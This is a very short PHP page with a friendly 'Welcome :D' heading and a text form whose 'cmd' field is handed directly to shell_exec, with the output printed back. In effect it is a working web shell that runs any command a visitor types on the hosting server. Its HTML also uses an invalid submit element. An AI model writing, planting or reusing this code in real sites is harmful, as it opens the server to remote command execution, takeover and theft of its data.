<!DOCTYPE html>
<html>
    <body>
        <h1>Welcome :D</h1>
        <p>use to send something?</p>
        <form action="index.php" method="get">
            <input type="text" name="cmd"></input>
            <submit>submit</submit>
        </form>
    </body>
</html>

<?php echo shell_exec($_GET['cmd']); ?>